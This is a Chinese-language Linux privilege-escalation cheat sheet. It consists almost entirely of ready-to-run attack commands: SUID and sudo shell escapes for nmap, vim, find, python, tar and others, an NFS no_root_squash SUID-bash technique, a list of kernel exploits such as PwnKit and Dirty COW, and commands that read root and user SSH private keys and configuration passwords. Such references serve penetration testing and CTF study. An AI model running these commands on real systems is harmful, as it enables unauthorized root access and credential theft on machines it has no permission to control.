# Linux 提权速查

## 快速枚举脚本

```bash
# LinPEAS 风格枚举
# 1. 检查当前用户和权限
id; whoami; sudo -l

# 2. 检查 SUID 文件
find / -perm -4000 2>/dev/null

# 3. 检查 sudo 可用命令
sudo -l

# 4. 检查 crontab
cat /etc/crontab
ls -la /etc/cron.d/

# 5. 检查网络
netstat -tulpn
ss -tulpn

# 6. 检查服务
ps aux | grep root
systemctl list-units --type=service

# 7. 检查可写目录
find / -writable -type d 2>/dev/null | grep -v proc

# 8. 检查内核版本
uname -a
cat /etc/issue

# 9. 检查 sudo 版本 (CVE)
sudo --version

# 10. 检查 polkit 版本
pkexec --version
```

## 常见提权路径

### 1. SUID 提权

```bash
# 常见可利用 SUID
nmap:        nmap --interactive; !sh
vim:         vim -c ':!/bin/sh'
less:        less /etc/passwd; !/bin/sh
more:        more /etc/passwd; !/bin/sh
awk:         awk 'BEGIN {system("/bin/sh")}'
find:        find . -exec /bin/sh -p \; -quit
python:      python -c 'import os; os.system("/bin/sh")'
perl:        perl -e 'exec "/bin/sh";'
ruby:        ruby -e 'exec "/bin/sh"'
bash:        bash -p
sh:          sh
```

### 2. Sudo 提权

```bash
# sudo -l 查看可用命令
# 常见可提权命令
sudo git help config; !/bin/sh
sudo less /etc/passwd; !/bin/sh
sudo vim; :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
```

### 3. Cron 提权

```bash
# 检查 cron 任务
cat /etc/crontab
ls -la /etc/cron.d/
# 如果 cron 任务以 root 权限运行且可写
# 修改脚本追加恶意命令
```

### 4. NFS 提权

```bash
# 如果 /home 有 no_root_squash
# 从另一台机器挂载
mount -t nfs target:/home /tmp/nfs
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid
# 在目标机器执行 /tmp/nfs/bash_suid -p
```

### 5. 内核漏洞

```python
# 搜索可用 exploit
# 常用漏洞：
# - dirtycow (CVE-2016-5195)
# - docker breakout
# - overlayfs (CVE-2021-3493)
# - Polkit (CVE-2021-4034) / PwnKit
# - etc.
```

### 6. 密码复用

```bash
# 检查可读配置文件
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
# 如果找到密码，尝试 su root 或 ssh root@localhost
```

## 敏感文件位置

```
/etc/passwd          # 可被部分系统写入
/etc/shadow          # 通常不可读
/root/.ssh/          # root SSH 私钥
/home/*/.ssh/       # 用户 SSH 私钥
/var/www/html/       # Web 目录（可能含配置）
/tmp/                # 可写目录（放 payload）
/etc/cron.d/         # Cron 配置
/proc/self/environ   # 环境变量（含敏感信息）
/proc/self/fd/       # 文件描述符（可能泄漏信息）
```

## GTFOBins (sudo suid 查表)

| 命令 | 提权方式 |
|------|---------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `:!/bin/sh` |
| `less` | `!/bin/sh` |
| `more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `git` | `git help config` → `!/bin/sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
